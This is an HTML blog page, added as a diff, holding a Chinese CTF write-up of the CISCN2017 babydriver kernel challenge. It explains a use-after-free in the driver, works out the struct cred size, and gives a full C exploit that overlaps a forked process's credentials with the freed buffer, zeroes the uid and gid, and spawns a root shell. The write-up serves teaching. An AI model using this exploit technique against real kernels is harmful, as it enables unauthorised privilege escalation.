@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.mark0519.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="kernel UAF（一）CISCN2017 - babydriver分析IDA pro分析 没有去符号表（hhh好怀念这样的感觉）  提供这么些函数 **babyrelease ： ** 主要是kfree(babydev_struct.device_buf); babyopen:   babydev_struct.device_buf &#x3D; (char *)kmem_cache_alloc_tra">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kernel-UAF">
+<meta property="og:url" content="https://blog.mark0519.com/post/kernel-UAF.html">
+<meta property="og:site_name" content="Mark&#39;s blog">
+<meta property="og:description" content="kernel UAF（一）CISCN2017 - babydriver分析IDA pro分析 没有去符号表（hhh好怀念这样的感觉）  提供这么些函数 **babyrelease ： ** 主要是kfree(babydev_struct.device_buf); babyopen:   babydev_struct.device_buf &#x3D; (char *)kmem_cache_alloc_tra">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imgdb.cn/item/621cd0a22ab3f51d91e86d86.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/621de9fe2ab3f51d9167db1e.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/621debe92ab3f51d916ada21.png">
+<meta property="article:published_time" content="2022-02-28T13:08:36.000Z">
+<meta property="article:modified_time" content="2022-03-01T09:51:51.507Z">
+<meta property="article:author" content="Mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="UAF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/621cd0a22ab3f51d91e86d86.png">
+
+<link rel="canonical" href="https://blog.mark0519.com/post/kernel-UAF.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>kernel-UAF | Mark's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mark's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.mark0519.com/post/kernel-UAF.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+      <meta itemprop="name" content="Mark0519">
+      <meta itemprop="description" content="菜鸡CTFer的自留地">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mark's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          kernel-UAF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-28 21:08:36" itemprop="dateCreated datePublished" datetime="2022-02-28T21:08:36+08:00">2022-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-01 17:51:51" itemprop="dateModified" datetime="2022-03-01T17:51:51+08:00">2022-03-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="kernel-UAF（一）"><a href="#kernel-UAF（一）" class="headerlink" title="kernel UAF（一）"></a>kernel UAF（一）</h1><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 - babydriver"></a>CISCN2017 - babydriver</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>IDA pro分析 没有去符号表（hhh好怀念这样的感觉）</p>
+<p><img src="https://pic.imgdb.cn/item/621cd0a22ab3f51d91e86d86.png"></p>
+<p>提供这么些函数</p>
+<p>**babyrelease ： **</p>
+<p>主要是<code>kfree(babydev_struct.device_buf);</code></p>
+<p><strong>babyopen:</strong>  </p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmem_cache_alloc_trace</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> <span class="token number">64LL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>期中kmem_cache_alloc_trace()函数实际上就是调用kmalloc()的时候最后起作用的函数</p>
+<p>**babyioctl : ** </p>
+<p>ioctl是设备驱动程序中对设备的I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的 <strong>传输波特率</strong>、马达的转速等等。它的调用个数如下： </p>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">ioctl</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> ind cmd<span class="token punctuation">,</span> …<span class="token punctuation">)</span>； <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>  其中fd是用户程序打开设备时使用 <strong>open函数返回的文件标示符</strong>，cmd是用户程序对设备的 <strong>控制命令</strong>，至于后面的省略号，那是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。<br>  ioctl函数是文件结构中的一个属性分量，就是说如果你的驱动程序提供了对ioctl的支持，用户就可以在用户程序中使用ioctl函数来控制设备的I/O通道。</p>
+<p>其中在babyioctl中定义了一个新的cmd 0x10001：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> command <span class="token operator">==</span> <span class="token number">0x10001</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">kfree</span><span class="token punctuation">(</span>babydev_struct<span class="token punctuation">.</span>device_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    babydev_struct<span class="token punctuation">.</span>device_buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_kmalloc</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0x24000C0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">=</span> v4<span class="token punctuation">;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"alloc done\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>babywrite 和babyread ：</strong></p>
+<p>分别主要调用  copy_from_user(); 和  copy_to_user(buffer);</p>
+<p> copy_to_user()这个函数的完整形态为</p>
+<pre class="line-numbers language-none"><code class="language-none">unsigned long copy_to_user(void *to, const void *from, unsigned long n);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个函数的作用是将内核空间的数据复制到用户空间。其中<br>to：目标地址（用户空间）<br>from：源地址（内核空间）<br>n：将要拷贝数据的字节数<br>返回：成功返回0，失败返回没有拷贝成功的数据字节数</p>
+<p>​    copy_from_user()这个函数的完整形态为</p>
+<pre class="line-numbers language-none"><code class="language-none">unsigned long copy_from_user(void *to, const void *from, unsigned long n);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个函数的作用是将用户空间的数据复制到内核空间。其中</p>
+<p>to：目标地址（内核空间）<br>from：源地址（用户空间）<br>n：将要拷贝数据的字节数<br>返回：成功返回0，失败返回没有拷贝成功的数据字节数</p>
+<p>使用这个两个函数就可以实现内核空间和用户空间的数据交互</p>
+<p>**babydriver_init 和 babydriver_exit **</p>
+<p>两个函数分别完成了 <strong>/dev/babydev</strong> 设备的初始化和清理</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>没有用户态传统的溢出等漏洞，但存在一个伪条件竞争引发的 UAF 漏洞。</p>
+<p>也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过的，这样就造成了一个 UAF。</p>
+<p>之后就可以修个cred来提权到root</p>
+<p>之后根据 UAF 的思想，思路如下：</p>
+<ol>
+<li>打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小</li>
+<li>释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠</li>
+<li>同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root</li>
+</ol>
+<p>首先遇到的问题就是计算cred的size</p>
+<p>一种方法是在init文件中得知内核版本为4.4.72 </p>
+<p>在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118">cred.h - include/linux/cred.h - Linux source code (v4.4.72) - Bootlin</a>中可以查找到cred的定义源码</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token punctuation">&#123;</span>
+	<span class="token class-name">atomic_t</span>	usage<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_DEBUG_CREDENTIALS</span></span>
+	<span class="token class-name">atomic_t</span>	subscribers<span class="token punctuation">;</span>	<span class="token comment">/* number of processes subscribed */</span>
+	<span class="token keyword">void</span>		<span class="token operator">*</span>put_addr<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span>	magic<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC</span>	<span class="token expression"><span class="token number">0x43736564</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC_DEAD</span>	<span class="token expression"><span class="token number">0x44656144</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+	<span class="token class-name">kuid_t</span>		uid<span class="token punctuation">;</span>		<span class="token comment">/* real UID of the task */</span>
+	<span class="token class-name">kgid_t</span>		gid<span class="token punctuation">;</span>		<span class="token comment">/* real GID of the task */</span>
+	<span class="token class-name">kuid_t</span>		suid<span class="token punctuation">;</span>		<span class="token comment">/* saved UID of the task */</span>
+	<span class="token class-name">kgid_t</span>		sgid<span class="token punctuation">;</span>		<span class="token comment">/* saved GID of the task */</span>
+	<span class="token class-name">kuid_t</span>		euid<span class="token punctuation">;</span>		<span class="token comment">/* effective UID of the task */</span>
+	<span class="token class-name">kgid_t</span>		egid<span class="token punctuation">;</span>		<span class="token comment">/* effective GID of the task */</span>
+	<span class="token class-name">kuid_t</span>		fsuid<span class="token punctuation">;</span>		<span class="token comment">/* UID for VFS ops */</span>
+	<span class="token class-name">kgid_t</span>		fsgid<span class="token punctuation">;</span>		<span class="token comment">/* GID for VFS ops */</span>
+	<span class="token keyword">unsigned</span>	securebits<span class="token punctuation">;</span>	<span class="token comment">/* SUID-less security management */</span>
+	<span class="token class-name">kernel_cap_t</span>	cap_inheritable<span class="token punctuation">;</span> <span class="token comment">/* caps our children can inherit */</span>
+	<span class="token class-name">kernel_cap_t</span>	cap_permitted<span class="token punctuation">;</span>	<span class="token comment">/* caps we're permitted */</span>
+	<span class="token class-name">kernel_cap_t</span>	cap_effective<span class="token punctuation">;</span>	<span class="token comment">/* caps we can actually use */</span>
+	<span class="token class-name">kernel_cap_t</span>	cap_bset<span class="token punctuation">;</span>	<span class="token comment">/* capability bounding set */</span>
+	<span class="token class-name">kernel_cap_t</span>	cap_ambient<span class="token punctuation">;</span>	<span class="token comment">/* Ambient capability set */</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span>	jit_keyring<span class="token punctuation">;</span>	<span class="token comment">/* default keyring to attach requested
+					 * keys to */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">key</span> __rcu <span class="token operator">*</span>session_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring inherited over fork */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">key</span>	<span class="token operator">*</span>process_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this process */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">key</span>	<span class="token operator">*</span>thread_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this thread */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">key</span>	<span class="token operator">*</span>request_key_auth<span class="token punctuation">;</span> <span class="token comment">/* assumed request_key authority */</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_SECURITY</span></span>
+	<span class="token keyword">void</span>		<span class="token operator">*</span>security<span class="token punctuation">;</span>	<span class="token comment">/* subjective LSM security */</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+	<span class="token keyword">struct</span> <span class="token class-name">user_struct</span> <span class="token operator">*</span>user<span class="token punctuation">;</span>	<span class="token comment">/* real user ID subscription */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">user_namespace</span> <span class="token operator">*</span>user_ns<span class="token punctuation">;</span> <span class="token comment">/* user_ns the caps and keyrings are relative to. */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">group_info</span> <span class="token operator">*</span>group_info<span class="token punctuation">;</span>	<span class="token comment">/* supplementary groups for euid/fsgid */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">rcu_head</span>	rcu<span class="token punctuation">;</span>		<span class="token comment">/* RCU deletion hook */</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>或者自己编译出一个内核模块make之后查看</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//mydriver.c</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cred.h></span></span>
+
+<span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"Dual BSD/GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">my_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Size of struct cred : %ld\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cred</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Size of type atomic_t : %ld\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">atomic_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Size of type void* : %ld\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Size of type unsigned : %ld\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Size of type kuid_t : %ld\n"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">kuid_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">my_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Goodbye, baby driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">module_init</span><span class="token punctuation">(</span>my_init<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">module_exit</span><span class="token punctuation">(</span>my_exit<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Makefile</p>
+<pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> cred_size.o
+KERNELBUILD <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> uname -r<span class="token punctuation">)</span>/build
+
+<span class="token target symbol">modules</span><span class="token punctuation">:</span>
+    make -C <span class="token variable">$</span><span class="token punctuation">(</span>KERNELBUILD<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>CURDIR<span class="token punctuation">)</span> modules
+<span class="token target symbol">clean</span><span class="token punctuation">:</span>
+    make -C <span class="token variable">$</span><span class="token punctuation">(</span>KERNELBUILD<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>CURDIR<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后得到该版本的cred的 size = 0xA8</p>
+<p>另一种方法是</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat &#x2F;proc&#x2F;kallsyms | grep &quot;cred_init&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://pic.imgdb.cn/item/621de9fe2ab3f51d9167db1e.png"></p>
+<p>然后将所得地址的后几位记下来，将vmlinux导入ida，查找后几位得到cred的大小</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stropts.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token comment">// 打开两次设备</span>
+    <span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token number">0xa8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 释放 fd1</span>
+    <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span>
+    <span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] fork error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span>
+        <span class="token keyword">char</span> zeros<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> zeros<span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] root now."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="get-root-shell"><a href="#get-root-shell" class="headerlink" title="get root shell"></a>get root shell</h3><p>由于kernel中没有libc，首先需要静态编译编写的exp</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gcc exp.c -static -o exp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
